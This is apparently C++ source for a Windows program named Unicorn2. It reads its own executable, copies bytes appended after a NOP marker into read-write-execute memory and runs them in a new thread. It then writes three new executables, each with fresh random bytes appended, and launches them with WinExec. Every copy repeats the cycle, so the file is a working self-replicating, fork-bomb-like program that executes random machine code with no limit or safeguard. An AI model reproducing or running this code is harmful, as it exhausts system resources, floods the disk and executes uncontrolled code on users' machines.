// Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include<Windows.h>
#define NextPayloadSize 1024
#define NextNum 3
#define GapTime 512

int myEXESize = 0;
int myStaticLength = 0;
int myPayloadLength = 0;
UINT8* myFileBuffer = 0;
UINT8* executeableMem = 0;
UINT8 nextPayloadBuf[NextPayloadSize] = { 0 };
char nextEXEName[256] = { 0 };

typedef void(*myFunc)(void);
//void(*f1)(void) = (void(*)(void)) executeableMem;
//static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };

void GenNxtPayload();

int main(int argc, char** argv)
{
    //printf("0x%x", myTestcode[0]);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8 *)malloc(myEXESize);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp);
    for (int i = 0; i < myEXESize - 2; i++)
        if (myFileBuffer[i] == 0x90 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90)
        {
            //printf("Found Payload Start @ 0x%X\n", i);
            myStaticLength = i;
            myPayloadLength = myEXESize - myStaticLength;
            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(executeableMem, myFileBuffer + myStaticLength, myPayloadLength);
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)executeableMem, 0, 0, 0);
            break;
        }
    if (myStaticLength == 0)
        myStaticLength = myEXESize;
    for (int i = 0; i < NextNum; i++)
    {
        GenNxtPayload();
        srand((unsigned)time(NULL));
        sprintf(nextEXEName, "Unicor2-0x%X.exe", rand());
        fp = fopen(nextEXEName, "wb");
        fwrite(myFileBuffer, 1, myStaticLength, fp);
        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
        fclose(fp);
        WinExec(nextEXEName, 0);
        Sleep(GapTime);
    }
    
}

void GenNxtPayload()
{
    nextPayloadBuf[0] = 0x90;
    nextPayloadBuf[1] = 0x90;
    nextPayloadBuf[2] = 0x90;
    srand((unsigned)time(NULL));
    for (int i = 3; i < NextPayloadSize - 1; i++)
    {
        nextPayloadBuf[i] = rand() % 256;
    }
    nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
}
